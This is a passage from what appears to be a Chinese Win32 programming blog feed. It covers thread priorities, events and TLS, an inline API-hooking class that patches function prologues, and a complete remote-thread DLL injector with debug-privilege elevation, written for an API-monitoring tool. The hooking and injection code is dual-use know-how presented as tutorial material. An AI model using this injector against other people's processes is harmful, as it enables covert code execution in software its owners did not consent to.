<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadIdle</span><span class="params">(LPVOID l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i++&lt;<span class="number">10</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Idel\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadNormal</span><span class="params">(LPVOID l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i++&lt;<span class="number">10</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Normal\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwThreadID;</span><br><span class="line">	HANDLE h[<span class="number">2</span>];</span><br><span class="line">	h[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						ThreadIdle,</span><br><span class="line">						<span class="literal">NULL</span>,</span><br><span class="line">						CREATE_SUSPENDED,</span><br><span class="line">						&amp;dwThreadID);</span><br><span class="line">	SetThreadPriority(h[<span class="number">0</span>],THREAD_PRIORITY_IDLE);</span><br><span class="line">	ResumeThread(h[<span class="number">0</span>]);</span><br><span class="line">	h[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						ThreadNormal,</span><br><span class="line">						<span class="literal">NULL</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						&amp;dwThreadID);</span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>,h,TRUE,INFINITE);					</span><br><span class="line">	CloseHandle(h[<span class="number">0</span>]);				</span><br><span class="line">	CloseHandle(h[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较简单，就是开两个线程，来看运行的先后顺序，先暂停第一个低级别，设置完级别之后就开第二个中级别的，最后等内核对象执行完释放。<br>但是可能我的CPU比较强大（嘻嘻嘻，12个肯定快喽），所以我这里基本就是间接运行的，在低版本XP的时候还是可以看出效果的，我这里的效果是：<br><img src="img1.jpg" alt="效果图"><br>可以看到Normal虽然在后面，但是还是有重叠，但是不稳定。</p>
<h2 id="临界区对象"><a href="#临界区对象" class="headerlink" title="临界区对象"></a>临界区对象</h2><p>这个之前说过，而且操作起来相对简单，这里就不提了。<br>但有一点需要注意的是，这个临界区不是内核对象，所以不能再进程之间进行同步。</p>
<h2 id="互锁函数"><a href="#互锁函数" class="headerlink" title="互锁函数"></a>互锁函数</h2><p>这个操作也是比较简单，但是就是单一了，只能对变量进行加减：<br>减：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">InterlockedDecrement</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPLONG lpAddend   <span class="comment">// address of the variable to decrement</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>加：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">InterlockedIncrement</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPLONG lpAddend   <span class="comment">// pointer to the variable to increment</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>提供参数给他就能保证安全了。</p>
<h2 id="内核事件对象"><a href="#内核事件对象" class="headerlink" title="内核事件对象"></a>内核事件对象</h2><p>这个算是比较常用的，主要是有两点比较混淆。<br>分为自动重置和人工重置，区分就是：</p>
<ol>
<li>自动重置的话呢，当我们的函数执行完毕没必要调用<code>ResetEvent</code>这个函数告诉其他线程，并且当我们执行完毕之后只有一个等待的对象会进行工作。</li>
<li>人工重置的话呢就是，执行完毕我们还要调用<code>ResetEvent</code>来让其他线程知道，但是这样会让所有线程都活过来。</li>
</ol>
<p>示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt; </span></span></span><br><span class="line">HANDLE g_hEvent;</span><br><span class="line">UINT __<span class="function">stdcall <span class="title">ChildFunc</span><span class="params">(LPVOID)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hChildThread;</span><br><span class="line">	UINT uId;</span><br><span class="line">	g_hEvent = CreateEvent(<span class="literal">NULL</span>,FALSE,FALSE,<span class="literal">NULL</span>);</span><br><span class="line">	hChildThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>,ChildFunc,<span class="literal">NULL</span>,<span class="number">0</span>,&amp;uId);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Please sure to working:"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	SetEvent(g_hEvent);</span><br><span class="line">	WaitForSingleObject(hChildThread,INFINITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"end"</span>);</span><br><span class="line">	CloseHandle(hChildThread);</span><br><span class="line">	CloseHandle(g_hEvent);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UINT __<span class="function">stdcall <span class="title">ChildFunc</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WaitForSingleObject(g_hEvent,INFINITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Working\n"</span>);</span><br><span class="line">	Sleep(<span class="number">5000</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="TLS局部存储"><a href="#TLS局部存储" class="headerlink" title="TLS局部存储"></a>TLS局部存储</h2><p>这个东西是非常的好用滴，就是说每个线程都有属于自己的一块线程位数组，每个位都是存放一个索引的，通过一个位可以存取和放置一个LPVOID的值，这个位是由主线程提供的。<br>简单地说就是主线程提供一个索引，子线程通过这个索引可以存取和获取这个索引对应的值，并且这个是独立，一个线程是没办法设置别的线程对应的值的。<br>看下例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ThreadTime.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt; </span></span></span><br><span class="line"></span><br><span class="line">DWORD g_tlsUsedTime;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStartTime</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">GetUsedTime</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">UINT __<span class="function">stdcall <span class="title">ChildFunc</span><span class="params">(LPVOID)</span></span>;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	UINT uId;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	HANDLE h[<span class="number">10</span>];</span><br><span class="line">	g_tlsUsedTime = TlsAlloc();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">		h[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>,ChildFunc,<span class="literal">NULL</span>,<span class="number">0</span>,&amp;uId);</span><br><span class="line">	WaitForMultipleObjects(<span class="number">10</span>,h,TRUE,INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">		CloseHandle(h[i]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	TlsFree(g_tlsUsedTime);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UINT __<span class="function">stdcall <span class="title">ChildFunc</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	InitStartTime();</span><br><span class="line">	i = <span class="number">10000</span>*<span class="number">10000</span>;</span><br><span class="line">	<span class="keyword">while</span>(i--)&#123;&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ProcessID:%d,Used Time:%d\n"</span>,GetCurrentThreadId(),GetUsedTime());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStartTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwStart = GetTickCount();</span><br><span class="line">	TlsSetValue(g_tlsUsedTime,(LPVOID)dwStart);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD <span class="title">GetUsedTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwEnd = GetTickCount();</span><br><span class="line">	dwEnd = dwEnd-(DWORD)TlsGetValue(g_tlsUsedTime);</span><br><span class="line">	<span class="keyword">return</span> dwEnd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是获取时间的一个验证程序。<br><img src="img2.jpg" alt="效果"><br>思路比较简单，就是通过设置这个独特的位置开始的时间，然后运行完毕之后，再通过获取这个位来达到计时的效果。</p>
<p>简单的总结这个线程操作，就是公共的变量我们必须要保护起来，因为你不知道什么时候他就会出现错误，可能变成别的值，因为CPU是靠时间片来运行的，突然分给别的线程是很有可能的。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>CULHook</title>
    <url>/2020/02/11/CULHook/</url>
    <content><![CDATA[<h2 id="CULHook类"><a href="#CULHook类" class="headerlink" title="CULHook类"></a>CULHook类</h2><p>这个类写起来时很暴力的，和书上说的一样，我喜欢。<br>思路也比较简单粗暴，就是将我们的API指向地址的前八个字节写成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax,0xXXXX</span><br><span class="line">jmp eax</span><br></pre></td></tr></table></figure>
<p>也就是：<br><img src="img1.jpg" alt="汇编代码"><br>这里比较难搞的就是地址我们怎么赋值，可能有人就要考虑到一个大端小段，但是我们强转成DWOD类型就可以解决这个困惑了。</p>
<h3 id="头文件："><a href="#头文件：" class="headerlink" title="头文件："></a>头文件：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ULHOOK_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __ULHOOK_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CULHook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CULHook(LPSTR pszModName,LPSTR pszFuncName,PROC pfnHook);<span class="comment">//这个新的函数是需要naked的，不要处理堆栈平衡</span></span><br><span class="line">	~CULHook();</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">Unhook</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">Rehook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	PROC m_pfnOrig;</span><br><span class="line">	BYTE m_btNewBytes[<span class="number">8</span>];</span><br><span class="line">	BYTE m_btOldBytes[<span class="number">8</span>];</span><br><span class="line">	HMODULE m_hModule;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__ULHOOK_H__</span></span></span><br></pre></td></tr></table></figure>
<p>这里就一个构造函数就可以进行HOOK了，但是非常注意的就是由于我们是直接暴力的写汇编，所以我们是不能要堆栈操作的。</p>
<h3 id="源文件"><a href="#源文件" class="headerlink" title="源文件"></a>源文件</h3><p>构造函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CULHook::CULHook(LPSTR pszModName,LPSTR pszFuncName,PROC pfnHook)</span><br><span class="line">&#123;</span><br><span class="line">	BYTE btNewBytes[<span class="number">8</span>] = &#123;<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x40</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xE0</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">	<span class="built_in">memcpy</span>(m_btNewBytes,btNewBytes,<span class="number">8</span>);</span><br><span class="line">	*(DWORD *)(m_btNewBytes+<span class="number">1</span>) = (DWORD)pfnHook;</span><br><span class="line">	m_hModule = LoadLibrary(pszModName);</span><br><span class="line">	<span class="keyword">if</span> (m_hModule == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pfnOrig = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	m_pfnOrig = GetProcAddress(m_hModule,pszFuncName);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (m_pfnOrig != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwOldProtect;</span><br><span class="line">		MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">		VirtualQuery(m_pfnOrig,&amp;mbi,<span class="keyword">sizeof</span>(mbi));</span><br><span class="line">		VirtualProtect(m_pfnOrig,<span class="number">8</span>,PAGE_READWRITE,&amp;dwOldProtect);</span><br><span class="line">		<span class="built_in">memcpy</span>(m_btOldBytes,m_pfnOrig,<span class="number">8</span>);</span><br><span class="line">		WriteProcessMemory(GetCurrentProcess(),(LPVOID)m_pfnOrig,m_btNewBytes,<span class="keyword">sizeof</span>(DWORD)*<span class="number">2</span>,<span class="literal">NULL</span>);</span><br><span class="line">		VirtualProtect(m_pfnOrig,<span class="number">8</span>,dwOldProtect,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先将我们的汇编代码改一下，这里可以看到非常的巧妙，先转成DWORD然后再赋值，然后我们再将2,3,4,5这四个字节替换成我们的地址，这个是真的巧妙，之后我们就获取要HOOK函数的地址，再将这个地址的前八个字节的保护属性改掉，改完之后，写我们的这八个字节。</p>
<p>取消HOOK和重新HOOK：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CULHook::Unhook()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m_pfnOrig != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwOldProtect;</span><br><span class="line">		MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">		VirtualQuery(m_pfnOrig,&amp;mbi,<span class="keyword">sizeof</span>(mbi));</span><br><span class="line">		VirtualProtect(m_pfnOrig,<span class="number">8</span>,PAGE_READWRITE,&amp;dwOldProtect);</span><br><span class="line">		<span class="built_in">memcpy</span>(m_btOldBytes,m_pfnOrig,<span class="number">8</span>);</span><br><span class="line">		WriteProcessMemory(GetCurrentProcess(),(LPVOID)m_pfnOrig,m_btOldBytes,<span class="keyword">sizeof</span>(DWORD)*<span class="number">2</span>,<span class="literal">NULL</span>);</span><br><span class="line">		VirtualProtect(m_pfnOrig,<span class="number">8</span>,dwOldProtect,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CULHook::Rehook()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m_pfnOrig != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwOldProtect;</span><br><span class="line">		MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">		VirtualQuery(m_pfnOrig,&amp;mbi,<span class="keyword">sizeof</span>(mbi));</span><br><span class="line">		VirtualProtect(m_pfnOrig,<span class="number">8</span>,PAGE_READWRITE,&amp;dwOldProtect);</span><br><span class="line">		<span class="built_in">memcpy</span>(m_btOldBytes,m_pfnOrig,<span class="number">8</span>);</span><br><span class="line">		WriteProcessMemory(GetCurrentProcess(),(LPVOID)m_pfnOrig,m_btNewBytes,<span class="keyword">sizeof</span>(DWORD)*<span class="number">2</span>,<span class="literal">NULL</span>);</span><br><span class="line">		VirtualProtect(m_pfnOrig,<span class="number">8</span>,dwOldProtect,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>取消HOOK和重新HOOK就是一样，也就是修改前八个字节。</p>
<p>析构函数就是先取消HOOK，然后再释放DLL句柄</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CULHook::~CULHook()</span><br><span class="line">&#123;</span><br><span class="line">	Unhook();</span><br><span class="line">	<span class="keyword">if</span>(m_hModule != <span class="literal">NULL</span>)</span><br><span class="line">		FreeLibrary(m_hModule);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>API监视</title>
    <url>/2020/02/11/API%E7%9B%91%E8%A7%86/</url>
    <content><![CDATA[<h2 id="API监视工具"><a href="#API监视工具" class="headerlink" title="API监视工具"></a>API监视工具</h2><p>这款工具的功能就是，我们运行一个程序的时候我们可以监视用户输入的某个API函数是否在指定程序中使用到，如果使用到了，那么将会先到我们这里来。</p>
<h2 id="程序的思路"><a href="#程序的思路" class="headerlink" title="程序的思路"></a>程序的思路</h2><p>思路不是很难，就是HOOK我们的API函数，但是由于我们不知道函数的入栈规则（因为API是用户输入的，参数类型和个数是不确定的），所以我们只能编写一小段不占用堆栈的函数，然后跳转到我们真正的函数的（并不是说不调用，而是在内部CALL的时候可以使用，但是要保证堆栈的完全平衡）。但是如何让我们的CAPIHook类知道我们要监视的函数呢，这个就要用到我们的CShareMemory类，这个类在我之前的博客写过。</p>
<h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>这里因为我们要专门注入某个进程，所以使用尽量能简单写就简单写，索引这里我们就用远程注入进行注入DLL。</p>
<h3 id="DLL注入的简单区分"><a href="#DLL注入的简单区分" class="headerlink" title="DLL注入的简单区分"></a>DLL注入的简单区分</h3><p>这里简单了解一下为什么要学习多种DLL注入（不包括那些乱七八糟的注入，什么注册表…的）</p>
<ol>
<li>远程注入DLL，这种注入比较好用，在用OD注入的时候也经常用到，这个注入的思想就是和我们写Call基本上是一模一样，但是有一点区别就是说，我们这里的函数地址是根据Windows版本不同自动变化的，简单说就是由于<code>KERNEL32.DLL</code>映射在地址空间中的时候在所有的进程中的地址一样，并且有一点很重要，<code>LoadLibraryA</code>这个函数的入栈和其他的方式和我们调用远程线程的线程回掉函数一模一样，所以这就暗示我们可以直接在别的进程加载DLL。</li>
<li>为什么远程注入这么好用我们还需要学这个钩子注入方法？其实很明显就是说你会发现我们的远程注入是存在一个缺陷的，就是说他只能注入某个进程，但是钩子就不一样了，他可以监控整个系统，导致我们可以注入整个系统（需要进程有钩子）。</li>
</ol>
<p>远程注入的优点：</p>
<ul>
<li>调用起来稳定</li>
<li>简单实用，而且DLL里面只需要有我们需要的函数</li>
</ul>
<p>远程注入的缺点：</p>
<ul>
<li>只能注入某一个进程</li>
</ul>
<p>钩子注入的优点：</p>
<ul>
<li>可以注入整个系统存在钩子的进程</li>
</ul>
<p>钩子注入的缺点：</p>
<ul>
<li>需要导出DLL中的钩子函数</li>
<li>目标进程必须存在某种行为，也就是钩子所需要的监视过程（一般用消息循环，但是窗口程序确实没有）</li>
</ul>
<h3 id="远程注入"><a href="#远程注入" class="headerlink" title="远程注入"></a>远程注入</h3><p>之前已经说过了钩子注入，这里说一下远程注入。</p>
<p>头文件：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRemThreadInjector</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CRemThreadInjector(LPCTSTR pszDllName);</span><br><span class="line">	~CRemThreadInjector();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//注入DLL到指定进程空间</span></span><br><span class="line">	<span class="function">BOOL <span class="title">InjectModuleInto</span><span class="params">(DWORD dwProcessId,BOOL bInject = TRUE)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">char</span> m_szDllName[MAX_PATH];</span><br><span class="line">	<span class="function"><span class="keyword">static</span> BOOL <span class="title">EnableDebugPrivilege</span><span class="params">(BOOL bEnable)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>声明的话呢就一个构造函数，一个析构函数和一个注入函数，除此之外还有一个静态函数，这个静态函数是比较特殊的。<br><code>EnableDebugPrivilege</code>这个函数是一个提权函数，因为某些比较高权限的程序我们是注入不进去，就比如下PID较低的函数是不能注入的，所以我们需要提升我们的权限：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CRemThreadInjector::EnableDebugPrivilege(BOOL bEnable)</span><br><span class="line">&#123;</span><br><span class="line">	BOOL bOk = FALSE;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	<span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		LUID uID;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>,SE_DEBUG_NAME,&amp;uID);</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Luid = uID;</span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = bEnable?SE_PRIVILEGE_ENABLED:<span class="number">0</span>;</span><br><span class="line">		AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="keyword">sizeof</span>(tp),<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">		bOk = (GetLastError() == ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传进来一个是否是提权还是降权，首先我们鲜活的我们当前的进程Token，然后再获取我们的UID，获取之后申请一个权限变量：<code>TOKEN_PRIVILEGES tp;</code>，然后将我们的安全属性设置为：SE_PRIVILEGE_ENABLED或0（提权或者降权），最后再调整，关掉句柄。</p>
<p>在构造函数和析构函数中我们作如下操作：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CRemThreadInjector::CRemThreadInjector(LPCTSTR pszDllName)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">strncpy</span>(m_szDllName,pszDllName,MAX_PATH);</span><br><span class="line">	EnableDebugPrivilege(TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CRemThreadInjector::~CRemThreadInjector()</span><br><span class="line">&#123;</span><br><span class="line">	EnableDebugPrivilege(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是一个字符串拷贝和提权降权。<br>核心的注入代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CRemThreadInjector::InjectModuleInto(DWORD dwProcessId,BOOL bInject)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (GetCurrentProcessId() == dwProcessId)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//先查看是否加载了模块</span></span><br><span class="line">	BOOL bFound = FALSE;</span><br><span class="line">	MODULEENTRY32 me32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,dwProcessId);</span><br><span class="line">	me32.dwSize = <span class="keyword">sizeof</span>(MODULEENTRY32);</span><br><span class="line">	<span class="keyword">if</span> (Module32First(hModuleSnap,&amp;me32))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (lstrcmpiA(me32.szExePath,m_szDllName) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				bFound = TRUE;<span class="comment">//找到了</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (Module32Next(hModuleSnap,&amp;me32));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (bInject == bFound)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION ,FALSE,dwProcessId);</span><br><span class="line">	<span class="keyword">if</span>(hProcess == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">"KERNEL32.DLL"</span>);</span><br><span class="line"></span><br><span class="line">	LPTHREAD_START_ROUTINE pfnStartRoutine;</span><br><span class="line">	HANDLE hRemoteThread ;</span><br><span class="line">	<span class="keyword">if</span>(bInject)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> cbSize = (<span class="built_in">strlen</span>(m_szDllName)+<span class="number">1</span>);</span><br><span class="line">		LPVOID lpRemoteDllName = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,cbSize,MEM_COMMIT , PAGE_EXECUTE_READWRITE);</span><br><span class="line">		WriteProcessMemory(hProcess,lpRemoteDllName,m_szDllName,cbSize,<span class="literal">NULL</span>);</span><br><span class="line">		pfnStartRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule,<span class="string">"LoadLibraryA"</span>);</span><br><span class="line">		hRemoteThread = CreateRemoteThread(hProcess,<span class="literal">NULL</span>,<span class="number">0</span>,pfnStartRoutine,lpRemoteDllName,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		pfnStartRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule,<span class="string">"FreeLibrary"</span>);</span><br><span class="line">		hRemoteThread = CreateRemoteThread(hProcess,<span class="literal">NULL</span>,<span class="number">0</span>,pfnStartRoutine,me32.hModule,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(hRemoteThread,INFINITE);</span><br><span class="line"></span><br><span class="line">	CloseHandle(hRemoteThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
